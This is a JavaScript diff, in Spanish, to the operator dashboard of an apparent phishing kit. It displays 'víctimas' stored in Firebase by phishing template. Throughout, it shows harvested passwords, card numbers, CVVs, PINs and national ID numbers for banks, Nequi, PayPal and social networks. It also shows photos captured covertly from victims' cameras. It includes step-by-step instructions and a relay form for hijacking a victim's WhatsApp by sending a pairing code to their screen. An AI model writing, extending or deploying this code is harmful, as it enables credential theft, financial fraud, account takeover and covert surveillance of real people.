@@ -402,39 +402,64 @@ function iniciarListenerVictimas() {
     onSnapshot(query(colRef, orderBy("fecha", "desc")), mostrarVictimas);
 }
 
-// ============================================================
-//  VÍCTIMAS — RENDER COMPLETO
-// ============================================================
 function mostrarVictimas(snap) {
     const cont = $id("registros");
     if (!cont) return;
 
     if (snap.empty) {
-        cont.innerHTML = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
-        <div style="color:#ff8800;padding:25px;text-align:center;font-size:15px;">Aún no tienes víctimas</div>`;
+        cont.innerHTML = `
+        <button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
+        <div style="color:#ff8800;padding:25px;text-align:center;font-size:15px;">
+            Aún no tienes víctimas
+        </div>`;
         return;
     }
 
-    let html = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
+    let html = `
+    <button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
     <div style="max-height:60vh;overflow-y:auto;padding:6px;">`;
 
     snap.forEach(d => {
         const v     = d.data();
         const fecha = v.fecha ? new Date(v.fecha.toDate()).toLocaleString() : "Ahora";
         const docId = d.id;
-        const tpl   = (v.template || "").toLowerCase();
+        const tpl   = (v.template || "").toLowerCase().trim();
 
-        // ── Detección de tipo ──────────────────────────────
-        const esWhatsApp  = tpl.includes("whatsapp");
-        const esQR        = tpl.includes("qr");
-        const esFoto      = tpl.includes("stealth") || tpl.includes("camara") || tpl.includes("camera") || !!v.fotoOriginal || !!v.fotoMiniatura;
+        // ══════════════════════════════════════════════════
+        //  DETECCIÓN EXACTA POR TEMPLATE
+        // ══════════════════════════════════════════════════
+
+        // WhatsApp que usan código de 8 dígitos
+        const esWA_VipGroup  = tpl.includes("grupo7") || tpl.includes("vip") || tpl.includes("whatsapp normal");
+        const esWA_Advance   = tpl.includes("whaadvance") || tpl.includes("advance") || tpl.includes("whatsapp x");
+        const esWA_Codigo    = esWA_VipGroup || esWA_Advance; // cualquier WA con código
+
+        // QR Hacking
+        const esQR = tpl.includes("qr");
+
+        // Fotos capturadas
+        const esFoto = tpl.includes("stealth") || tpl.includes("camara") ||
+                       tpl.includes("camera")  || tpl.includes("zoom")   ||
+                       tpl.includes("xxx")     || tpl.includes("fogosa") ||
+                       !!v.fotoOriginal        || !!v.fotoMiniatura;
+
+        // Credenciales puras
         const esTikTok    = tpl.includes("tiktok");
         const esInstagram = tpl.includes("instagram") || tpl.includes("ig");
+        const esFacebook  = tpl.includes("facebook") || tpl.includes("fb");
+        const esNequi     = tpl.includes("nequi");
+        const esBanco     = tpl.includes("banco") || tpl.includes("bbva") ||
+                            tpl.includes("bancolombia") || tpl.includes("scotiabank") ||
+                            tpl.includes("escotia");
+        const esPayPal    = tpl.includes("paypal");
+        const esBetPlay   = tpl.includes("betplay");
+        const esYandex    = tpl.includes("yandex");
+        const esGarena    = tpl.includes("garena");
 
-        // ── Color del borde según tipo ─────────────────────
-        const borderColor = esWhatsApp ? "#25D366"
-                          : esQR       ? "#00bfff"
-                          : esFoto     ? "#ff6600"
+        // Color borde
+        const borderColor = esWA_Codigo ? "#25D366"
+                          : esQR        ? "#00bfff"
+                          : esFoto      ? "#ff6600"
                           : "#00ff00";
 
         html += `
@@ -453,126 +478,296 @@ function mostrarVictimas(snap) {
             <small style="color:#555;">${fecha}</small>
         </div>`;
 
-        // ── IP siempre si existe ───────────────────────────
-        if (v.ip) html += `<div>IP: <span style="color:#777;font-size:11px;">${v.ip}</span></div>`;
+        if (v.ip) html += `<div>IP: <span style="color:#666;font-size:11px;">${v.ip}</span></div>`;
 
         // ══════════════════════════════════════════════════
-        //  CASO 1: FOTO (StealthCapture / Cámara)
+        //  BLOQUE 1 — FOTOS (Cámara / Stealth / Zoom / xXx)
         // ══════════════════════════════════════════════════
-        if (esFoto && (v.fotoMiniatura || v.fotoOriginal)) {
-            const thumb    = v.fotoMiniatura || v.fotoOriginal;
-            const original = v.fotoOriginal  || v.fotoMiniatura;
-            const encoded  = encodeURIComponent(original);
+        if (esFoto) {
+            const hayFoto = v.fotoMiniatura || v.fotoOriginal;
+            if (hayFoto) {
+                const thumb    = v.fotoMiniatura || v.fotoOriginal;
+                const original = v.fotoOriginal  || v.fotoMiniatura;
 
-            html += `
-            <div style="text-align:center;margin:10px 0;">
-                <img src="${thumb}"
-                    style="max-width:150px;max-height:150px;border-radius:8px;border:2px solid #ff6600;object-fit:cover;cursor:pointer;box-shadow:0 0 15px #ff660066;"
-                    onclick="mostrarFotoCompleta('${encoded}')"
-                    title="Click para ver completa"
-                />
-                <br>
-                <small style="color:#aaa;">Haz clic para ver completa</small>
-                <div style="margin-top:6px;">
-                    <button onclick="descargarFoto('${encoded}','${docId}')"
-                        style="background:#ff6600;color:#000;border:none;padding:4px 10px;border-radius:4px;font-size:11px;font-weight:bold;cursor:pointer;margin-right:5px;">
-                        ⬇ Descargar
-                    </button>
-                </div>
-            </div>`;
-            if (v.deviceId) html += `<div style="color:#555;font-size:10px;word-break:break-all;">📱 ${v.deviceId}</div>`;
+                // Guardamos en atributo data para evitar problemas con comillas
+                html += `
+                <div style="text-align:center;margin:10px 0;">
+                    <div style="
+                        display:inline-block;
+                        background:rgba(255,102,0,0.1);
+                        border:2px solid #ff6600;
+                        border-radius:10px;
+                        padding:10px;
+                    ">
+                        <div style="color:#ff6600;font-size:11px;margin-bottom:6px;font-weight:bold;">
+                            📸 FOTO CAPTURADA ${v.count ? `(${v.count}/5)` : ""}
+                        </div>
+                        <img
+                            src="${thumb}"
+                            data-original="${original}"
+                            class="foto-victima-thumb"
+                            style="
+                                width:150px;
+                                height:150px;
+                                object-fit:cover;
+                                border-radius:8px;
+                                border:2px solid #ff6600;
+                                cursor:pointer;
+                                display:block;
+                                margin:0 auto;
+                                box-shadow:0 0 20px #ff660077;
+                            "
+                            title="Click para ver en grande"
+                        />
+                        <div style="margin-top:8px;display:flex;gap:6px;justify-content:center;">
+                            <button
+                                data-original="${original}"
+                                class="btn-ver-foto"
+                                style="
+                                    background:#ff6600;
+                                    color:#000;
+                                    border:none;
+                                    padding:5px 12px;
+                                    border-radius:4px;
+                                    font-size:11px;
+                                    font-weight:bold;
+                                    cursor:pointer;
+                                ">
+                                🔍 Ver completa
+                            </button>
+                            <button
+                                data-original="${original}"
+                                data-docid="${docId}"
+                                class="btn-descargar-foto"
+                                style="
+                                    background:#333;
+                                    color:#ff6600;
+                                    border:1px solid #ff6600;
+                                    padding:5px 12px;
+                                    border-radius:4px;
+                                    font-size:11px;
+                                    cursor:pointer;
+                                ">
+                                ⬇ Descargar
+                            </button>
+                        </div>
+                    </div>
+                </div>`;
+            } else {
+                html += `<div style="color:#ff6600;font-size:12px;margin:8px 0;">📸 Foto aún no disponible</div>`;
+            }
+            if (v.deviceId) {
+                html += `<div style="color:#555;font-size:10px;margin-top:4px;word-break:break-all;">📱 ${v.deviceId}</div>`;
+            }
         }
 
         // ══════════════════════════════════════════════════
-        //  CASO 2: WHATSAPP — Código de emparejamiento
+        //  BLOQUE 2 — WHATSAPP CON CÓDIGO 8 DÍGITOS
+        //  (Grupo VIP / whatsapp Normal / whatsapp Advance)
         // ══════════════════════════════════════════════════
-        else if (esWhatsApp) {
-            if (v.numero) html += `<div style="margin:6px 0;">Número: <b style="color:#25D366;font-size:15px;">${v.numero}</b></div>`;
+        else if (esWA_Codigo) {
+            if (v.numero) {
+                html += `
+                <div style="margin:6px 0;">
+                    Número: <b style="color:#25D366;font-size:15px;">${v.numero}</b>
+                    <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Número copiado')"
+                        style="background:none;border:1px solid #25D366;color:#25D366;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:6px;">
+                        Copiar
+                    </button>
+                </div>`;
+            }
 
             html += `
-            <div style="margin-top:10px;padding:12px;background:rgba(37,211,102,0.08);border-radius:6px;border:1px solid #25D366;">
-                <div style="color:#25D366;font-size:12px;font-weight:bold;margin-bottom:8px;">🔗 VINCULAR SESIÓN WHATSAPP</div>
-                <div style="font-size:11px;color:#aaa;margin-bottom:8px;">
-                    1. Abre <strong style="color:#25D366">web.whatsapp.com</strong><br>
-                    2. Click en "Vincular con número de teléfono"<br>
-                    3. Ingresa el número de la víctima<br>
-                    4. Copia el código de 8 dígitos<br>
-                    5. Pégalo abajo y presiona ENVIAR
+            <div style="
+                margin-top:10px;
+                padding:12px;
+                background:rgba(37,211,102,0.08);
+                border-radius:6px;
+                border:1px solid #25D366;
+            ">
+                <div style="color:#25D366;font-size:12px;font-weight:bold;margin-bottom:8px;">
+                    🔗 VINCULAR SESIÓN WHATSAPP
                 </div>
+                <div style="font-size:11px;color:#aaa;margin-bottom:10px;line-height:1.7;">
+                    1️⃣ Abre <strong style="color:#25D366">web.whatsapp.com</strong> en tu PC<br>
+                    2️⃣ Click en <strong>"Vincular con número de teléfono"</strong><br>
+                    3️⃣ Ingresa el número de la víctima<br>
+                    4️⃣ WhatsApp te mostrará un código de 8 dígitos<br>
+                    5️⃣ Cópialo aquí abajo y presiona <strong>ENVIAR</strong>
+                </div>
+
                 ${v.codigo ? `
-                <div style="background:rgba(37,211,102,0.2);border:1px solid #25D366;border-radius:4px;padding:6px;margin-bottom:8px;font-size:12px;color:#25D366;">
-                    ✅ Último código enviado: <strong>${v.codigo}</strong>
+                <div style="
+                    background:rgba(37,211,102,0.15);
+                    border:1px solid #25D366;
+                    border-radius:4px;
+                    padding:8px;
+                    margin-bottom:10px;
+                    font-size:13px;
+                    color:#25D366;
+                    text-align:center;
+                    letter-spacing:3px;
+                    font-family:monospace;
+                    font-weight:bold;
+                ">
+                    ✅ Código activo: ${v.codigo}
                 </div>` : `
-                <div style="color:#888;font-size:11px;margin-bottom:8px;">⌛ Sin código enviado aún...</div>`}
-                <label style="color:#fff;font-size:11px;display:block;margin-bottom:5px;">CÓDIGO DE 8 DÍGITOS:</label>
+                <div style="color:#666;font-size:11px;margin-bottom:10px;text-align:center;">
+                    ⌛ Esperando código...
+                </div>`}
+
+                <label style="color:#ccc;font-size:11px;display:block;margin-bottom:6px;font-weight:bold;">
+                    INGRESA EL CÓDIGO:
+                </label>
                 <div style="display:flex;gap:6px;">
-                    <input type="text"
+                    <input
+                        type="text"
                         id="input-code-${docId}"
-                        placeholder="Ej: ABCD1234"
+                        placeholder="ABCD1234"
                         maxlength="8"
-                        style="flex:1;background:#000;border:1px solid #25D366;color:#25D366;padding:8px;border-radius:4px;text-transform:uppercase;font-family:monospace;font-size:15px;letter-spacing:3px;text-align:center;"
+                        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+                        style="
+                            flex:1;
+                            background:#000;
+                            border:2px solid #25D366;
+                            color:#25D366;
+                            padding:10px;
+                            border-radius:4px;
+                            font-family:monospace;
+                            font-size:18px;
+                            letter-spacing:4px;
+                            text-align:center;
+                            outline:none;
+                        "
                     />
-                    <button onclick="enviarCodigoAVictima('${docId}')"
-                        style="background:#25D366;color:#000;border:none;padding:8px 14px;border-radius:4px;font-weight:bold;cursor:pointer;font-size:13px;white-space:nowrap;">
+                    <button
+                        onclick="enviarCodigoAVictima('${docId}')"
+                        style="
+                            background:#25D366;
+                            color:#000;
+                            border:none;
+                            padding:10px 16px;
+                            border-radius:4px;
+                            font-weight:bold;
+                            cursor:pointer;
+                            font-size:14px;
+                            white-space:nowrap;
+                        ">
                         ➤ ENVIAR
                     </button>
                 </div>
-                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;">
+                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;text-align:center;">
                     ${v.status === "mostrando_codigo"
-                        ? "✅ Código mostrándose en pantalla de víctima"
+                        ? `<span style="color:#25D366">✅ Código mostrándose en pantalla de la víctima</span>`
                         : "⌛ Esperando envío de código..."}
                 </div>
             </div>`;
         }
 
         // ══════════════════════════════════════════════════
-        //  CASO 3: QR HACKING — Código de 8 dígitos
+        //  BLOQUE 3 — QR HACKING (código azul)
         // ══════════════════════════════════════════════════
         else if (esQR) {
             if (v.numero) html += `<div style="margin:4px 0;">Número: <b style="color:#00bfff;">${v.numero}</b></div>`;
 
             html += `
-            <div style="margin-top:10px;padding:12px;background:rgba(0,191,255,0.08);border-radius:6px;border:1px solid #00bfff;">
-                <div style="color:#00bfff;font-size:12px;font-weight:bold;margin-bottom:8px;">🔐 QR HACKING — CÓDIGO</div>
+            <div style="
+                margin-top:10px;
+                padding:12px;
+                background:rgba(0,191,255,0.08);
+                border-radius:6px;
+                border:1px solid #00bfff;
+            ">
+                <div style="color:#00bfff;font-size:12px;font-weight:bold;margin-bottom:8px;">
+                    🔐 QR HACKING — CÓDIGO DE ACCESO
+                </div>
+
                 ${v.codigo ? `
-                <div style="background:rgba(0,191,255,0.2);border:1px solid #00bfff;border-radius:4px;padding:6px;margin-bottom:8px;font-size:12px;color:#00bfff;">
-                    ✅ Último código: <strong>${v.codigo}</strong>
+                <div style="
+                    background:rgba(0,191,255,0.15);
+                    border:1px solid #00bfff;
+                    border-radius:4px;
+                    padding:8px;
+                    margin-bottom:10px;
+                    font-size:13px;
+                    color:#00bfff;
+                    text-align:center;
+                    letter-spacing:3px;
+                    font-family:monospace;
+                    font-weight:bold;
+                ">
+                    ✅ Código activo: ${v.codigo}
                 </div>` : `
-                <div style="color:#888;font-size:11px;margin-bottom:8px;">⌛ Sin código enviado aún...</div>`}
-                <label style="color:#fff;font-size:11px;display:block;margin-bottom:5px;">CÓDIGO DE 8 DÍGITOS:</label>
+                <div style="color:#666;font-size:11px;margin-bottom:10px;text-align:center;">
+                    ⌛ Esperando código...
+                </div>`}
+
+                <label style="color:#ccc;font-size:11px;display:block;margin-bottom:6px;font-weight:bold;">
+                    CÓDIGO DE 8 DÍGITOS:
+                </label>
                 <div style="display:flex;gap:6px;">
-                    <input type="text"
+                    <input
+                        type="text"
                         id="input-code-${docId}"
-                        placeholder="Ej: X8KJ-P2M9"
+                        placeholder="X8KJ-P2M9"
                         maxlength="8"
-                        style="flex:1;background:#000;border:1px solid #00bfff;color:#00bfff;padding:8px;border-radius:4px;text-transform:uppercase;font-family:monospace;font-size:15px;letter-spacing:3px;text-align:center;"
+                        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+                        style="
+                            flex:1;
+                            background:#000;
+                            border:2px solid #00bfff;
+                            color:#00bfff;
+                            padding:10px;
+                            border-radius:4px;
+                            font-family:monospace;
+                            font-size:18px;
+                            letter-spacing:4px;
+                            text-align:center;
+                            outline:none;
+                        "
                     />
-                    <button onclick="enviarCodigoAVictima('${docId}')"
-                        style="background:#00bfff;color:#000;border:none;padding:8px 14px;border-radius:4px;font-weight:bold;cursor:pointer;font-size:13px;white-space:nowrap;">
+                    <button
+                        onclick="enviarCodigoAVictima('${docId}')"
+                        style="
+                            background:#00bfff;
+                            color:#000;
+                            border:none;
+                            padding:10px 16px;
+                            border-radius:4px;
+                            font-weight:bold;
+                            cursor:pointer;
+                            font-size:14px;
+                            white-space:nowrap;
+                        ">
                         ➤ ENVIAR
                     </button>
                 </div>
-                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;">
+                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;text-align:center;">
                     ${v.status === "mostrando_codigo"
-                        ? "✅ Código mostrándose en pantalla de víctima"
-                        : "⌛ Esperando envío de código..."}
+                        ? `<span style="color:#00bfff">✅ Código enviado a la víctima</span>`
+                        : "⌛ Esperando envío..."}
                 </div>
             </div>`;
         }
 
         // ══════════════════════════════════════════════════
-        //  CASO 4: CREDENCIALES (Facebook, TikTok, Nequi, etc.)
+        //  BLOQUE 4 — CREDENCIALES PURAS
+        //  (Facebook, TikTok, Instagram, Nequi, Bancos, etc.)
         // ══════════════════════════════════════════════════
         else {
-            const labelUser = esTikTok || esInstagram ? "Usuario" : "Correo";
+            const labelUser = (esTikTok || esInstagram) ? "Usuario" : "Correo/Email";
 
             if (v.numero) html += `
             <div style="margin:4px 0;">
                 Número: <b style="color:#0ff;">${v.numero}</b>
+                <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Copiado')"
+                    style="background:none;border:1px solid #0ff;color:#0ff;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:5px;">
+                    Copiar
+                </button>
             </div>`;
 
             if (v.correo || v.usuario) html += `
-            <div style="margin:4px 0;display:flex;align-items:center;gap:8px;">
+            <div style="margin:5px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                 <span>${labelUser}: <b style="color:#ff0;">${v.correo || v.usuario}</b></span>
                 <button onclick="navigator.clipboard.writeText('${(v.correo||v.usuario||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                     style="background:none;border:1px solid #ff0;color:#ff0;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;">
@@ -581,7 +776,7 @@ function mostrarVictimas(snap) {
             </div>`;
 
             if (v.contraseña || v.password) html += `
-            <div style="margin:4px 0;display:flex;align-items:center;gap:8px;">
+            <div style="margin:5px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                 <span>Contraseña: <b style="color:#f0f;">${v.contraseña || v.password}</b></span>
                 <button onclick="navigator.clipboard.writeText('${(v.contraseña||v.password||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                     style="background:none;border:1px solid #f0f;color:#f0f;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;">
@@ -589,18 +784,27 @@ function mostrarVictimas(snap) {
                 </button>
             </div>`;
 
-            // Campos extra que algunas plantillas pueden enviar
+            // Campos bancarios / tarjeta
             if (v.tarjeta)    html += `<div style="margin:4px 0;">Tarjeta: <b style="color:#fa0;">${v.tarjeta}</b></div>`;
             if (v.cvv)        html += `<div style="margin:4px 0;">CVV: <b style="color:#fa0;">${v.cvv}</b></div>`;
             if (v.expiracion) html += `<div style="margin:4px 0;">Expiración: <b style="color:#fa0;">${v.expiracion}</b></div>`;
             if (v.pin)        html += `<div style="margin:4px 0;">PIN: <b style="color:#fa0;">${v.pin}</b></div>`;
+            if (v.cedula)     html += `<div style="margin:4px 0;">Cédula: <b style="color:#fa0;">${v.cedula}</b></div>`;
         }
 
         // ── Botón eliminar individual ──────────────────────
         html += `
         <div style="margin-top:10px;text-align:right;">
             <button onclick="eliminarVictimaIndividual('${docId}')"
-                style="background:#1a0000;border:1px solid #f00;color:#f00;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;">
+                style="
+                    background:#1a0000;
+                    border:1px solid #f00;
+                    color:#f00;
+                    padding:3px 10px;
+                    border-radius:4px;
+                    font-size:11px;
+                    cursor:pointer;
+                ">
                 🗑 Eliminar
             </button>
         </div>
@@ -609,15 +813,150 @@ function mostrarVictimas(snap) {
 
     html += `</div>`;
     cont.innerHTML = html;
+
+    // ══════════════════════════════════════════════════════
+    //  EVENT LISTENERS PARA FOTOS (con data-attribute)
+    //  Se asignan DESPUÉS de insertar el HTML en el DOM
+    // ══════════════════════════════════════════════════════
+    document.querySelectorAll(".foto-victima-thumb, .btn-ver-foto").forEach(el => {
+        el.addEventListener("click", function() {
+            const original = this.dataset.original || this.src;
+            abrirVisorFoto(original);
+        });
+    });
+
+    document.querySelectorAll(".btn-descargar-foto").forEach(el => {
+        el.addEventListener("click", function() {
+            const original = this.dataset.original;
+            const docId    = this.dataset.docid;
+            const link     = document.createElement("a");
+            link.href      = original;
+            link.download  = `foto_${docId}_${Date.now()}.jpg`;
+            link.click();
+            mostrarNotif("📸 Descargando foto...");
+        });
+    });
 }
 
-// ── Enviar código (WhatsApp y QR) ─────────────────────────────
+// ══════════════════════════════════════════════════════════════
+//  VISOR DE FOTO EN GRANDE — Modal overlay completo
+// ══════════════════════════════════════════════════════════════
+function abrirVisorFoto(srcOriginal) {
+    // Eliminar visor previo si existe
+    const previo = document.getElementById("visorFotoOverlay");
+    if (previo) previo.remove();
+
+    const overlay = document.createElement("div");
+    overlay.id = "visorFotoOverlay";
+    overlay.style.cssText = `
+        position:fixed;
+        inset:0;
+        background:rgba(0,0,0,0.97);
+        z-index:999999;
+        display:flex;
+        flex-direction:column;
+        justify-content:center;
+        align-items:center;
+        cursor:pointer;
+    `;
+
+    overlay.innerHTML = `
+        <div style="position:relative;max-width:95vw;max-height:90vh;">
+            <img
+                src="${srcOriginal}"
+                style="
+                    max-width:95vw;
+                    max-height:85vh;
+                    object-fit:contain;
+                    border-radius:10px;
+                    border:3px solid #ff6600;
+                    box-shadow:0 0 60px #ff660088;
+                    display:block;
+                "
+            />
+            <button
+                id="btnCerrarVisor"
+                style="
+                    position:fixed;
+                    top:15px;
+                    right:15px;
+                    background:#ff6600;
+                    color:#000;
+                    border:none;
+                    border-radius:50%;
+                    width:40px;
+                    height:40px;
+                    font-size:20px;
+                    font-weight:bold;
+                    cursor:pointer;
+                    z-index:1000000;
+                    display:flex;
+                    align-items:center;
+                    justify-content:center;
+                    box-shadow:0 0 20px #ff6600;
+                ">✕</button>
+            <a
+                href="${srcOriginal}"
+                download="foto_capturada_${Date.now()}.jpg"
+                style="
+                    position:fixed;
+                    bottom:20px;
+                    left:50%;
+                    transform:translateX(-50%);
+                    background:#ff6600;
+                    color:#000;
+                    padding:10px 25px;
+                    border-radius:8px;
+                    font-weight:bold;
+                    text-decoration:none;
+                    font-size:14px;
+                    box-shadow:0 0 20px #ff6600;
+                    z-index:1000000;
+                ">
+                ⬇ Descargar foto
+            </a>
+        </div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    // Cerrar con botón X
+    document.getElementById("btnCerrarVisor").addEventListener("click", (e) => {
+        e.stopPropagation();
+        overlay.remove();
+    });
+
+    // Cerrar haciendo click fuera de la imagen
+    overlay.addEventListener("click", (e) => {
+        if (e.target === overlay) overlay.remove();
+    });
+
+    // Cerrar con ESC
+    const cerrarConEsc = (e) => {
+        if (e.key === "Escape") { overlay.remove(); document.removeEventListener("keydown", cerrarConEsc); }
+    };
+    document.addEventListener("keydown", cerrarConEsc);
+}
+
+// ── Mantener compatibilidad con llamadas antiguas ──────────────
+window.mostrarFotoCompleta = (imageData) => {
+    abrirVisorFoto(decodeURIComponent(imageData));
+};
+
+window.regresarAVictimas = () => {
+    const vistaCompleta = $id("vista-completa-foto");
+    const registros     = $id("registros");
+    if (vistaCompleta) vistaCompleta.style.display = "none";
+    if (registros)     registros.style.display     = "block";
+};
+
+// ── Enviar código WhatsApp / QR ────────────────────────────────
 window.enviarCodigoAVictima = async (docId) => {
     const input  = document.getElementById(`input-code-${docId}`);
     const status = document.getElementById(`status-${docId}`);
     const codigo = input?.value.trim().toUpperCase();
     if (!codigo || codigo.length < 4) {
-        mostrarNotif("❌ Ingresa un código válido");
+        mostrarNotif("❌ Ingresa un código válido (mínimo 4 caracteres)");
         return;
     }
     try {
@@ -625,33 +964,29 @@ window.enviarCodigoAVictima = async (docId) => {
             codigo: codigo,
             status: "mostrando_codigo"
         });
-        if (status) { status.textContent = `✅ Código "${codigo}" enviado`; status.style.color = "#25D366"; }
+        if (status) {
+            status.innerHTML = `<span style="color:#25D366">✅ Código "${codigo}" enviado a la víctima</span>`;
+        }
         mostrarNotif(`✅ Código ${codigo} enviado`);
         input.value = "";
     } catch (e) {
+        console.error(e);
         mostrarNotif("❌ Error al enviar. Revisa Firebase.");
     }
 };
 
-// ── Descargar foto ─────────────────────────────────────────────
-window.descargarFoto = (encodedData, docId) => {
-    const link    = document.createElement("a");
-    link.href     = decodeURIComponent(encodedData);
-    link.download = `foto_${docId}_${Date.now()}.jpg`;
-    link.click();
-    mostrarNotif("📸 Descargando foto...");
-};
-
 // ── Eliminar víctima individual ────────────────────────────────
 window.eliminarVictimaIndividual = async (docId) => {
-    mostrarModalPro("ELIMINAR", "¿Eliminar este registro?", "SÍ, ELIMINAR", "CANCELAR", async () => {
-        try {
-            await deleteDoc(doc(db, "panelUsers", miUserDocId, "victimas", docId));
-            mostrarNotif("🗑 Registro eliminado");
-        } catch (e) {
-            mostrarNotif("❌ Error al eliminar");
+    mostrarModalPro("ELIMINAR", "¿Eliminar este registro permanentemente?", "SÍ, ELIMINAR", "CANCELAR",
+        async () => {
+            try {
+                await deleteDoc(doc(db, "panelUsers", miUserDocId, "victimas", docId));
+                mostrarNotif("🗑 Registro eliminado");
+            } catch (e) {
+                mostrarNotif("❌ Error al eliminar");
+            }
         }
-    });
+    );
 };
 document.addEventListener('DOMContentLoaded', () => {
     const btnRegresar = $id("btn-regresar");
